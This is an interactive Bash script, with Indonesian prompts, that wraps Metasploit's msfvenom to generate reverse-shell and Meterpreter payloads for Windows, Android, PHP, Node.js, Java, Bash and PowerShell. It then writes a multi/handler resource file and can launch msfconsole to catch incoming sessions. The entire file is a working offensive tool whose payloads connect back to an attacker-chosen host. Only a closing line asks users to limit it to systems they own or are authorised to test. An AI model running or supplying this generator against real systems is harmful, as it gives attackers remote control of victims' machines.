#!/bin/bash

# ================================================================
#  MSFVENOM PAYLOAD GENERATOR
#  Auto-generate cross-platform reverse shell payloads
# ================================================================

# ---------- Warna ----------
R='\033[0;31m'    # Red
G='\033[0;32m'    # Green
Y='\033[0;33m'    # Yellow
B='\033[0;34m'    # Blue
P='\033[0;35m'    # Purple
C='\033[0;36m'    # Cyan
W='\033[0;37m'    # White
BD='\033[1m'      # Bold
NC='\033[0m'      # Reset

# ---------- Fungsi Tampilan ----------
line()  { printf "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"; }
title() { printf "${BD}${C}  ███████╗ ██████╗     ${W}PAYLOAD GENERATOR${NC}\n"; }
box()   { printf "${P}┌${NC}"; printf '─%.0s' $(seq 1 68); printf "${P}┐${NC}\n"; }

info()  { printf "${B}${BD} [*]${NC} %s\n" "$*"; }
ok()    { printf "${G}${BD} [+]${NC} %s\n" "$*"; }
warn()  { printf "${Y}${BD} [!]${NC} %s\n" "$*"; }
err()   { printf "${R}${BD} [x]${NC} %s\n" "$*"; }
label() { printf "${C}${BD} %-10s${NC} ${W}:${NC} ${W}%s${NC}\n" "$1" "$2"; }

# ---------- Banner ----------
clear
printf "${R}${BD}"
printf "  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗\n"
printf "  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║\n"
printf "  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║\n"
printf "  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║\n"
printf "  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║\n"
printf "  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝\n"
printf "${NC}${G}"
printf "   ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ${NC}\n"
printf "${G}"
printf "   ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗${NC}\n"
printf "${G}"
printf "   ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██████╔╝${NC}\n"
printf "${G}"
printf "   ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██╔═══╝ ${NC}\n"
printf "${G}"
printf "   ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██║     ${NC}\n"
printf "${G}"
printf "   ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ${NC}\n"
printf "\n${W}${BD}         CROSS-PLATFORM REVERSE SHELL GENERATOR${NC}\n"
line
printf "${P}${BD}        Author : ${W}makmur${NC}   ${P}${BD}Tool : ${W}msfvenom (Metasploit)${NC}\n"
line
printf "\n"

# ---------- Deteksi IP Lokal ----------
DEFAULT_LHOST=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
[ -z "$DEFAULT_LHOST" ] && DEFAULT_LHOST="127.0.0.1"

# ---------- Input LHOST ----------
printf "${B}${BD}┌─${NC} ${W}${BD}Masukkan LHOST${NC} ${Y}[default: $DEFAULT_LHOST]${NC} ${B}${BD}─┐${NC}\n"
printf "${B}${BD}└─❯${NC} "
read -r LHOST
LHOST=${LHOST:-$DEFAULT_LHOST}

# ---------- Input LPORT ----------
printf "${B}${BD}┌─${NC} ${W}${BD}Masukkan LPORT${NC} ${Y}[default: 4444]${NC} ${B}${BD}─┐${NC}\n"
printf "${B}${BD}└─❯${NC} "
read -r LPORT
LPORT=${LPORT:-4444}

# ---------- Menu Payload ----------
box
printf "${P}${BD}│${NC} ${W}${BD}                    PILIH JENIS PAYLOAD                    ${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}├${NC}──────────────────────────────────────────────────────────────────${P}${BD}┤${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[01]${NC} ${C}Windows x64 Meterpreter${NC}        ${W}payload.exe ${Y}(Recommended)${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[02]${NC} ${C}Windows 32-bit Meterpreter${NC}      ${W}payload.exe${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[03]${NC} ${C}Windows x64 CMD Shell${NC}           ${W}payload.exe${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[04]${NC} ${C}Windows 32-bit CMD Shell${NC}        ${W}payload.exe${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[05]${NC} ${C}Android Meterpreter${NC}             ${W}payload.apk${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[06]${NC} ${C}PHP Reverse Shell${NC}               ${W}payload.php${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[07]${NC} ${C}Node.js Reverse Shell${NC}            ${W}payload.js${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[08]${NC} ${C}Java Meterpreter${NC}                ${W}payload.jar${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[09]${NC} ${C}Bash Reverse Shell${NC}              ${W}payload.sh${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}│${NC} ${G}${BD}[10]${NC} ${C}Windows PowerShell (.BAT)${NC}       ${W}payload.bat${NC}${P}${BD}│${NC}\n"
printf "${P}${BD}└${NC}──────────────────────────────────────────────────────────────────${P}${BD}┘${NC}\n"
printf "${Y}${BD}┌─${NC} ${W}${BD}Pilih Nomor Payload${NC} ${Y}[1-10, default: 1]${NC} ${Y}${BD}─┐${NC}\n"
printf "${Y}${BD}└─❯${NC} "
read -r PAYLOAD_CHOICE

case $PAYLOAD_CHOICE in
    2)  PAYLOAD="windows/meterpreter/reverse_tcp";   FORMAT="exe";  EXT="exe" ;;
    3)  PAYLOAD="windows/x64/shell_reverse_tcp";     FORMAT="exe";  EXT="exe" ;;
    4)  PAYLOAD="windows/shell_reverse_tcp";         FORMAT="exe";  EXT="exe" ;;
    5)  PAYLOAD="android/meterpreter/reverse_tcp";   FORMAT="apk";  EXT="apk" ;;
    6)  PAYLOAD="php/meterpreter_reverse_tcp";       FORMAT="raw";  EXT="php" ;;
    7)  PAYLOAD="nodejs/shell_reverse_tcp";          FORMAT="raw";  EXT="js" ;;
    8)  PAYLOAD="java/meterpreter/reverse_tcp";      FORMAT="jar";  EXT="jar" ;;
    9)  PAYLOAD="cmd/unix/reverse_bash";             FORMAT="raw";  EXT="sh" ;;
    10) PAYLOAD="cmd/windows/reverse_powershell";    FORMAT="bat";  EXT="bat" ;;
    *)  PAYLOAD="windows/x64/meterpreter/reverse_tcp"; FORMAT="exe"; EXT="exe" ;;
esac

# ---------- Input Nama Output ----------
printf "${C}${BD}┌─${NC} ${W}${BD}Nama File Output${NC} ${Y}[default: payload.$EXT]${NC} ${C}${BD}─┐${NC}\n"
printf "${C}${BD}└─❯${NC} "
read -r OUTPUT
OUTPUT=${OUTPUT:-payload.$EXT}

# ---------- Ringkasan Konfigurasi ----------
printf "\n"
line
printf "${P}${BD}  RINGKASAN KONFIGURASI${NC}\n"
line
printf "${P}${BD}│${NC}\n"
label "Payload" "$PAYLOAD"
label "LHOST"   "$LHOST"
label "LPORT"   "$LPORT"
label "Format"  "$FORMAT"
label "Output"  "$OUTPUT"
printf "${P}${BD}│${NC}\n"
line
printf "\n"

# ---------- Eksekusi msfvenom ----------
info "Menjalankan msfvenom..."
msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -o "$OUTPUT"

if [ $? -eq 0 ]; then
    printf "\n"
    line
    printf "${G}${BD}  PAYLOAD BERHASIL DIBUAT ✔${NC}\n"
    line
    printf "${G}${BD}│${NC}  Lokasi : ${W}${BD}$(pwd)/$OUTPUT${NC}\n"
    printf "${G}${BD}│${NC}  Ukuran : ${W}${BD}$(du -h "$OUTPUT" 2>/dev/null | cut -f1)${NC}\n"
    printf "${G}${BD}│${NC}\n"
    line
    printf "\n"

    read -p "$(printf "${Y}${BD}[?]${NC} Buat listener otomatis (handler.rc)? ${C}[y/N]:${NC} ")" BUILD_RC
    if [[ "$BUILD_RC" =~ ^[Yy]$ ]]; then
        # ---------- Deteksi Platform & Arch ----------
        case "$PAYLOAD" in
            windows/x64/*)   H_PLATFORM="windows"; H_ARCH="x64" ;;
            windows/*)       H_PLATFORM="windows"; H_ARCH="x86" ;;
            android/*)       H_PLATFORM="android"; H_ARCH="dalvik" ;;
            php/*)           H_PLATFORM="php";     H_ARCH="php" ;;
            nodejs/*)        H_PLATFORM="nodejs";  H_ARCH="nodejs" ;;
            java/*)          H_PLATFORM="java";    H_ARCH="java" ;;
            cmd/unix/*)      H_PLATFORM="unix";    H_ARCH="cmd" ;;
            cmd/windows/*)   H_PLATFORM="windows"; H_ARCH="cmd" ;;
            *)               H_PLATFORM="";        H_ARCH="" ;;
        esac

        H_EXIT="false"
        H_SCRIPT=""
        H_LAUNCH="n"

        # ---------- Menu Pengaturan Handler ----------
        while true; do
            printf "\n"
            line
            printf "${P}${BD}  PENGATURAN HANDLER${NC}\n"
            line
            label "Payload"       "$PAYLOAD"
            label "LHOST"         "$LHOST"
            label "LPORT"         "$LPORT"
            label "Platform"      "${H_PLATFORM:-auto}"
            label "Arch"          "${H_ARCH:-auto}"
            label "ExitOnSession" "$H_EXIT"
            label "AutoRunScript" "${H_SCRIPT:-kosong}"
            label "Auto-launch"   "${H_LAUNCH}"
            line
            printf "${C}${BD}│${NC} ${W}${BD}[1]${NC} Ubah ExitOnSession (tetap dengar setelah session)  ${C}${BD}│${NC}\n"
            printf "${C}${BD}│${NC} ${W}${BD}[2]${NC} AutoRunScript (cth: post/windows/manage/migrate)     ${C}${BD}│${NC}\n"
            printf "${C}${BD}│${NC} ${W}${BD}[3]${NC} Auto-launch msfconsole langsung                      ${C}${BD}│${NC}\n"
            printf "${C}${BD}│${NC} ${W}${BD}[s]${NC} Simpan handler.rc                                       ${C}${BD}│${NC}\n"
            printf "${C}${BD}│${NC} ${W}${BD}[q]${NC} Batal                                                   ${C}${BD}│${NC}\n"
            line
            printf "${Y}${BD}┌─${NC} ${W}${BD}Pilih${NC} ${Y}${BD}─┐${NC}\n"
            printf "${Y}${BD}└─❯${NC} "
            read -r H_OPT

            case "$H_OPT" in
                1)
                    printf "${C}${BD}[*]${NC} ExitOnSession [default: $H_EXIT]: "
                    read -r H_EXIT_IN
                    [ -n "$H_EXIT_IN" ] && H_EXIT="$H_EXIT_IN"
                    ;;
                2)
                    printf "${C}${BD}[*]${NC} AutoRunScript [kosong=hapus]: "
                    read -r H_SCRIPT
                    ;;
                3)
                    if [[ "$H_LAUNCH" == "y" ]]; then H_LAUNCH="n"; else H_LAUNCH="y"; fi
                    ;;
                s|S)
                    {
                        echo "use exploit/multi/handler"
                        echo "set PAYLOAD $PAYLOAD"
                        [ -n "$H_PLATFORM" ] && echo "set PLATFORM $H_PLATFORM"
                        [ -n "$H_ARCH" ] && echo "set ARCH $H_ARCH"
                        echo "set LHOST $LHOST"
                        echo "set LPORT $LPORT"
                        echo "set ExitOnSession $H_EXIT"
                        [ -n "$H_SCRIPT" ] && echo "set AutoRunScript $H_SCRIPT"
                        echo "exploit -j"
                    } > handler.rc
                    printf "\n${G}${BD}[+]${NC} Resource file dibuat : ${W}${BD}handler.rc${NC}\n"
                    if [[ "$H_LAUNCH" == "y" ]]; then
                        printf "${C}${BD}[*]${NC} Menjalankan listener... (Ctrl+C untuk keluar)${NC}\n"
                        msfconsole -q -r handler.rc
                    else
                        printf "${C}${BD}[*]${NC} Jalankan listener : ${W}${BD}msfconsole -r handler.rc${NC}\n"
                    fi
                    break
                    ;;
                q|Q)
                    printf "\n${Y}${BD}[!]${NC} Pembuatan handler dibatalkan.\n"
                    break
                    ;;
                *)
                    err "Pilihan tidak valid."
                    ;;
            esac
        done
    fi
else
    printf "\n"
    err "Gagal membuat payload. Pastikan msfvenom sudah terinstall."
fi

printf "\n"
printf "${P}${BD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
printf "${W}${BD}  [>>] Gunakan hanya pada sistem yang Anda miliki / punya izin.  [<<]${NC}\n"
printf "${P}${BD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
printf "\n"
